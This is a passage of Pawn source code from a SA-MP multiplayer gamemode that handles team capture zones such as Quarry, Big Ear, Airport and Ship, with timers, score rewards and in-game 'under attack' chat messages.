    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][DESERT] = 25;
    GangZoneStopFlashForAll(Zone[DESERT]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][DESERT] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Desert(playerid);
public Desert(playerid)
{
	DesertCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveQuarry(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[QUARRY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[QUARRY] = 1;
			 	timer[playerid][QUARRY] = SetTimerEx("Quarry", 25000, false,"i",playerid);
			 	Captured[playerid][QUARRY] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_DUBAI_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[QUARRY], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[QUARRY] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Quarry is under attack!");
			    }
			    else if(tCP[QUARRY] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Quarry is under attack!");
			    }
			    else if(tCP[QUARRY] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Quarry is under attack!");
			    }
			    else if(tCP[QUARRY] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][QUARRY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock QuarryCaptured(playerid)
{
	Captured[playerid][QUARRY] = 1;
	UnderAttack[QUARRY] = 0;
	KillTimer(timer[playerid][QUARRY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][QUARRY] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Quarry\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][QUARRY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Quarry"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[QUARRY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[QUARRY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Quarry\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingQuarry(playerid)
{
	Captured[playerid][QUARRY] = 1;
	UnderAttack[QUARRY] = 0;
	KillTimer(timer[playerid][QUARRY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][QUARRY] = 25;
    GangZoneStopFlashForAll(Zone[QUARRY]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][QUARRY] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Quarry(playerid);
public Quarry(playerid)
{
	QuarryCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveGuest(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[GUEST] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[GUEST] = 1;
			 	timer[playerid][GUEST] = SetTimerEx("Guest", 25000, false,"i",playerid);
			 	Captured[playerid][GUEST] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[GUEST] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"Army Guest House is under attack!");
			    }
			    else if(tCP[GUEST] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Army Guest House is under attack!");
			    }
			    else if(tCP[GUEST] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Army Guest House is under attack!");
			    }
			    else if(tCP[GUEST] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][GUEST] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock GuestCaptured(playerid)
{
	Captured[playerid][GUEST] = 1;
	UnderAttack[GUEST] = 0;
	KillTimer(timer[playerid][GUEST]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GUEST] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Army Guest House\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][GUEST] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Army Guest House"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[GUEST] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[GUEST]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Army Guest House\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingGuest(playerid)
{
	Captured[playerid][GUEST] = 1;
	UnderAttack[GUEST] = 0;
	KillTimer(timer[playerid][GUEST]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GUEST] = 25;
    GangZoneStopFlashForAll(Zone[GUEST]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][GUEST] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Guest(playerid);
public Guest(playerid)
{
	GuestCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveEar(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[EAR] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[EAR] = 1;
			 	timer[playerid][EAR] = SetTimerEx("BigEar", 25000, false,"i",playerid);
			 	Captured[playerid][EAR] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[EAR] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Big Ear is under attack!");
			    }
			    else if(tCP[EAR] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Big Ear is under attack!");
			    }
			    else if(tCP[EAR] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Big Ear is under attack!");
			    }
			    else if(tCP[EAR] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][EAR] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock EarCaptured(playerid)
{
	Captured[playerid][EAR] = 1;
	UnderAttack[EAR] = 0;
	KillTimer(timer[playerid][EAR]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][EAR] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Big Ear\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][EAR] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Big Ear"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[EAR] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[EAR]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
       GangZoneShowForAll(Zone[EAR], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[EAR], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Big Ear\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingEar(playerid)
{
	Captured[playerid][EAR] = 1;
	UnderAttack[EAR] = 0;
	KillTimer(timer[playerid][EAR]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][EAR] = 25;
    GangZoneStopFlashForAll(Zone[EAR]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][EAR] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward BigEar(playerid);
public BigEar(playerid)
{
	EarCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveAirport(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[AIRPORT] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[AIRPORT] = 1;
			 	timer[playerid][AIRPORT] = SetTimerEx("Airport", 25000, false,"i",playerid);
			 	Captured[playerid][AIRPORT] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[AIRPORT], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[AIRPORT] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Airport is under attack!");
			    }
			    else if(tCP[AIRPORT] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Airport is under attack!");
			    }
			    else if(tCP[AIRPORT] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Airport is under attack!");
			    }
			    else if(tCP[AIRPORT] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Airport is under attack!");
				}
				else if(tCP[AIRPORT] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Airport is under attack!");
				}
				else if(tCP[AIRPORT] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Airport is under attack!");
				}
				else if(tCP[AIRPORT] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Airport is under attack!");
				}
				else if(tCP[AIRPORT] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][AIRPORT] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock AirportCaptured(playerid)
{
	Captured[playerid][AIRPORT] = 1;
	UnderAttack[AIRPORT] = 0;
	KillTimer(timer[playerid][AIRPORT]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][AIRPORT] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, green,"Congratulations! You have captured \"Airport\" you received +5 scores and +$5000 cash!");
	//==========================================================================
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][AIRPORT] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, 0xFFFFFFFF,"*Your team has captured "cred"Airport"cwhite"! You received +2 score for it!");
		   GivePlayerScore(i, 2);
	   }
	}
	//==========================================================================
	tCP[AIRPORT] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[AIRPORT]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_PAKISTAN)
    {
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_PAKISTAN_COLOR);
	}
	else if(gTeam[playerid] == TEAM_DUBAI)
	{
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_DUBAI_COLOR);
	}
	else if(gTeam[playerid] == TEAM_INDIA)
	{
       GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_INDIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_CHINA)
	{
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_CHINA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_NEPAL)
    {
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_NEPAL_COLOR);
    }
    else if(gTeam[playerid] == TEAM_ML)
    {
	   GangZoneShowForAll(Zone[AIRPORT], TEAM_ZONE_ML_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"%s has captured \"Airport\" for team %s", pName(playerid), GetTeamName(playerid));
    SendClientMessageToAll(orange, str);
	return 1;
}
stock LeavingAirport(playerid)
{
	Captured[playerid][AIRPORT] = 1;
	UnderAttack[AIRPORT] = 0;
	KillTimer(timer[playerid][AIRPORT]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][AIRPORT] = 25;
    GangZoneStopFlashForAll(Zone[AIRPORT]);
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	   IsPlayerCapturing[i][AIRPORT] = 0;
	}
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	return 1;
}
forward Airport(playerid);
public Airport(playerid)
{
	AirportCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveShip(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[SHIP] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
			 	UnderAttack[SHIP] = 1;
			 	timer[playerid][SHIP] = SetTimerEx("Ship", 25000, false,"i",playerid);
			 	Captured[playerid][SHIP] = 0;
			 	SendClientMessage(playerid, 0xFFFFFFFF,"| - Stay in this checkpoint for 25 seconds to capture! - |");
             	if(gTeam[playerid] == TEAM_PAKISTAN)
			    {
				  GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_PAKISTAN_COLOR);
				}
				else if(gTeam[playerid] == TEAM_DUBAI)
				{
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_DUBAI_COLOR);
			    }
				else if(gTeam[playerid] == TEAM_INDIA)
				{
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_INDIA_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_CHINA)
			    {
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_CHINA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_USA_COLOR);
				}
                else if(gTeam[playerid] == TEAM_NEPAL)
				{
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_NEPAL_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ML)
				{
			      GangZoneFlashForAll(Zone[SHIP], TEAM_ZONE_ML_COLOR);
				}
				//------Message-----
			    if(tCP[SHIP] == TEAM_PAKISTAN)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<PAKISTAN>");
			      SendTeamMessage(TEAM_PAKISTAN, green,"*Ship is under attack!");
			    }
			    else if(tCP[SHIP] == TEAM_DUBAI)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Dubai>");
			      SendTeamMessage(TEAM_DUBAI, green,"*Ship is under attack!");
			    }
			    else if(tCP[SHIP] == TEAM_INDIA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<INDIA>");
			      SendTeamMessage(TEAM_INDIA, green,"*Ship is under attack!");
			    }
			    else if(tCP[SHIP] == TEAM_CHINA)
			    {
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<CHINA>");
			      SendTeamMessage(TEAM_CHINA, green,"*Ship is under attack!");
				}
				else if(tCP[SHIP] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Ship is under attack!");
				}
				else if(tCP[SHIP] == TEAM_NEPAL)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Nepal>");
			      SendTeamMessage(TEAM_NEPAL, green,"*Ship is under attack!");
				}
				else if(tCP[SHIP] == TEAM_ML)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is controlled by team "COL_RED"<Malaysia>");
			      SendTeamMessage(TEAM_ML, green,"*Ship is under attack!");
				}
				else if(tCP[SHIP] == TEAM_NONE)
				{
			      SendClientMessage(playerid, COLOR_WHITE,"This flag is not controlled by any team");
				}
				//---------loop-------//
				for(new i = 0; i < MAX_PLAYERS; i ++)
				{
				   IsPlayerCapturing[i][SHIP] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
